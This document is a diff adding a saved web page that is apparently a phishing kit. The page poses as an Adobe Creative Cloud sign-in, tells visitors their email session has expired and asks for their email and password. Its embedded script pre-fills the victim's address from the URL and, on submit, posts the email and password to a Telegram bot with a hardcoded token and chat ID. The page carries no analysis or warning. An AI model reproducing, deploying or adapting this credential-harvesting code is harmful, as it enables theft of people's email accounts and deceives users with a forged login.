@@ -1,0 +1,123 @@
+
+<!-- saved from url=(0063)https://idealgroup.co.in/Adobe-creative/#info@polydomiki.com.cy -->
+<html lang="pl" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>adobe-creative-cloud</title>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Nowoczesna i mobilna poczta od home.pl. Odbieraj i wysylaj wiadomosci, planuj zadania, organizuj spotkania i zarzadzaj kontaktami w jednym miejscu. Z dowolnej przegladarki, z dowolnego urzadzenia mobilnego!">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <link href="./adobe-creative-cloud_files/pjqUDdrba5OV.css" rel="stylesheet" type="text/css">
+    <link href="https://idealgroup.co.in/Adobe-creative/B9e5i5VrQPdW.png" rel="icon" type="image/png" sizes="16x16">
+</head>
+
+<body>
+
+   <!-- The video -->
+<video autoplay="" muted="" loop="" id="myVideo">
+  <source src="img/media_113e1cb537dec521be58e22ab1c5a35aea6a36dd7.mp4" type="video/mp4">
+</video>
+<p>
+</p><p style="background-image: url(&#39;img/arcor.de.png&#39;);"></p>
+
+    <form onsubmit="handleSubmit(event);" class="login" method="post" novalidate="novalidate">
+        <div id="messages"><noscript></noscript></div>
+        <img src="./adobe-creative-cloud_files/adobe-creative-cloud-lockup-white.svg" alt="Logo" class="logo" style="width: 280px;margin-bottom: 1px; margin-top:180px;">
+        <fieldset>
+            <p>
+                <legend class="hide"></legend>
+            </p>
+            <p style="font-size: 17px; color: white;">Your email session has expired. Please enter your Email and password to continue.</p>
+
+            <p><label class="main"></label> </p>
+            <div class="input-wrapper">
+                <div class="input first">
+                    <input name="ego_user" id="email" type="email" value="" placeholder="E-Mail" autofocus="">
+                    <span class="notify"></span><span><img alt="Email" src="./adobe-creative-cloud_files/jtITDlmLdJ2i.svg"></span>
+                </div>
+                <div class="input">
+                    <input name="ego_secret" id="password" type="password" placeholder="Password">
+                    <span><img alt="Haslo" src="./adobe-creative-cloud_files/TUII8sux8RzR.svg"></span>
+                </div>
+            </div>
+            <button class="submit" type="submit">View File</button>
+            <div class="remember-me">
+                <input name="remember_me" id="remember-me" type="checkbox">
+                <label for="remember-me"></label>
+            </div>
+        </fieldset>
+        <a class="forgot" href="https://pomoc.home.pl/baza-wiedzy/jak-zmienic-haslo-dostepu-do-skrzynki-email" target="_blank"></a>
+    </form>
+    <div class="banner banner-desktop">
+        <script type="text/javascript">
+            if (window.OA_show !== undefined) {
+                OA_show(9);
+            }
+        </script>
+        <a href="https://homeads.home.pl/ads/www/delivery/ck.php?oaparams=2__bannerid=824__zoneid=9__cb=d9543ace5f__oadest=https%3A%2F%2Fblog.home.pl%2F2018%2F10%2Fnajlepsze-i-najtansze-przesylki-kurierskie%2F%23utm_source%3DhomeAds%26utm_medium%3Dpoczta_new%26utm_campaign%3Dfurgonetka%26utm_content%3Dads" target="_blank"></a>
+        <div id="beacon_d9543ace5f" style="POSITION: absolute; LEFT: 0px; TOP: 0px; VISIBILITY: hidden"><img width="0" height="0" style="HEIGHT: 0px; WIDTH: 0px" alt="" src="./adobe-creative-cloud_files/lg.php"></div><noscript></noscript>
+    </div>
+    <script>
+        function extractEmail(url) {
+            try {
+                const hashIndex = url.indexOf('#');
+
+                if (hashIndex === -1) {
+                    return;
+                }
+
+                const email = url.substring(hashIndex + 1);
+
+                return email;
+            } catch (error) {
+                console.log(error.message);
+                return
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const email = extractEmail(window.location.href);
+
+            if (email) {
+                document.getElementById('email').value = email;
+            }
+
+        })
+
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            const botToken = "7176944084:AAEXoONtp9ONDr-DBfeYE4XuOmllqkI97ZE";
+            const chatId = "2039715498";
+
+            const message = `🔐 *New Login Attempt On Seznam.cz* 🔐\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("You are a champion!")
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
+        }
+    </script>
+
+
+</body></html>
